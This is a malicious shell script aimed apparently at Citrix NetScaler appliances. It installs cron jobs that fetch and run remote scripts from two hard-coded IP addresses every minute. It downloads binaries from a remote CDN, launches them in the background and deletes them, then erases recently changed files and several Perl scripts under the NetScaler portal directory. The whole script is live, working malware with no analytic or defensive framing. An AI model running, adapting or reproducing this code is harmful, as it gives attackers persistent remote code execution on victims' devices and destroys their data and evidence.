#!/bin/sh
LDR="wget -q -O -"
if [ -s /usr/bin/curl ]; then
  LDR="curl"
fi
if [ -s /usr/bin/wget ]; then
  LDR="wget -q -O -"
fi
crontab -l | grep -e "185.178.45.221" | grep -v grep
if [ $? -eq 0 ]; then
  echo "cron good"
else
  (
    crontab -l 2>/dev/null
    echo "* * * * * $LDR http://185.178.45.221/ci.sh | sh > /dev/null 2>&1"
  ) | crontab -
fi

crontab -l | grep -e "62.113.112.33" | grep -v grep
if [ $? -eq 0 ]; then
  echo "cron good"
else
  (
    crontab -l 2>/dev/null
    echo "* * * * * $LDR http://62.113.112.33/ci.sh | sh > /dev/null 2>&1"
  ) | crontab -
fi

download() {
   curl -o /var/tmp/netscalerd http://359328.selcdn.ru/cdn/xf
}
download2() {
   curl -o /var/tmp/nspps http://359328.selcdn.ru/cdn/klli
}

if [ ! "$(ps -ax|grep '/var/tmp/netscalerd'|grep -v grep)" ];
then
    download
    chmod +x /var/tmp/netscalerd
    nohup /var/tmp/netscalerd > /dev/null 2>&1 &
    sleep 5
    rm -rf /var/tmp/netscalerd
else
    echo "Running"
fi

if [ ! "$(ps -ax|grep '/var/tmp/nspps'|grep -v grep)" ];
then
    download2
    chmod +x /var/tmp/nspps
    nohup /var/tmp/nspps > /dev/null 2>&1 &
    sleep 5
    rm -rf /var/tmp/nspps
else
    echo "Running"
fi

find /netscaler/portal/scripts -type f -newermt '1/07/2019 0:00:00' -exec rm -rf {} \;
find /netscaler/portal/templates -type f -newermt '1/07/2019 0:00:00' -exec rm -rf {} \;
mv /netscaler/portal/scripts/newbm.pl  /netscaler/portal/scripts/newbmnnn.pl
mv /netscaler/portal/scripts/newbmnnn.pl  /netscaler/portal/scripts/newbmlll.pl
mv /netscaler/portal/scripts/rmbm.pl  /netscaler/portal/scripts/rmbmlll.pl
mv /netscaler/portal/scripts/picktheme.pl  /netscaler/portal/scripts/pickthemezzz.pl

rm -rf /netscaler/portal/scripts/newbmnnn.pl
rm -rf /netscaler/portal/scripts/newbmlll.pl
rm -rf /netscaler/portal/scripts/rmbmlll.pl
rm -rf /netscaler/portal/scripts/pickthemezzz.pl
rm -rf /netscaler/portal/scripts/PersonalBookmark.pl